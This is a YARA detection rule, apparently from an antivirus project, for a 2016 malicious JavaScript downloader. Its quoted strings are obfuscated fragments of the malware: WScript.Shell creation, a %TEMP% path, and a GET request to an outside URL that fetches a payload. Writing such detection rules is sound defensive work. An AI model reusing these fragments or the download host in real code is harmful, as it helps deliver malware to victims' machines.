rule sig_20160427_df44d70f574ae003795155b65e126672 {
  meta:
    description = "datamaliciousorder - file 20160427_df44d70f574ae003795155b65e126672.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fb7ce46e0cf65d8c791cf0fc1bab0dc393d4373fd922505ce7e08e5096842e0a"

  strings:
    $s1  = "function KnnwaJdkfh() {return YvfbvCeouh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"GZU5wCv" ascii
    $s2  = "function KnnwaJdkfh() {return YvfbvCeouh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"GZU5wCv" ascii
    $s3  = "function KbjikIscjg(ZykrgVetlm, OqntfYnjuy){MlujfGslds = MlujfGslds * 1; return ZykrgVetlm - OqntfYnjuy;};" fullword ascii
    $s4  = "var YvfbvCeouh = function VrqjqNtohx() {return ZkzakNyjio[OcmvaSouor](\"WScript\"+\".Shell\");}(), JbdxwOnujr = 11;" fullword ascii
    $s5  = "RczzpVxzwp[VqgieTdczm](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var ZkzakNyjio = this[\"WScript\"];" fullword ascii
    $s7  = "function ErjszQnmtf(){return GapedJovnh + \"\";};" fullword ascii
    $s8  = "if (RczzpVxzwp[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function WblkdBhcyb() {return ((XjvfuKtybe == true) && (XjvfuKtybe == KlpanInuiu)) ? 1 : MlujfGslds;};" fullword ascii
    $s10 = "function WnuvrNoatc(){return OcmvaSouor;};" fullword ascii
    $s11 = "CczwoWzxph = true;" fullword ascii
    $s12 = "}while (AvxulTsodm);" fullword ascii
    $s13 = "var KlpanInuiu = false;" fullword ascii
    $s14 = "function UckhlMtdqf(HivfcZfoir) {var ObqppPzcje = (1, 2, 3, 4, 5, HivfcZfoir); return ObqppPzcje;};" fullword ascii
    $s15 = "function FldbtOiltc()" fullword ascii
    $s16 = "XjvfuKtybe = true; " fullword ascii
    $s17 = "function YkgeoXcoop(){return 23;};" fullword ascii
    $s18 = "var CczwoWzxph = false;" fullword ascii
    $s19 = "KlpanInuiu = true; " fullword ascii
    $s20 = "return KbjikIscjg(PvageEpgmz, OqicdIfovl);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}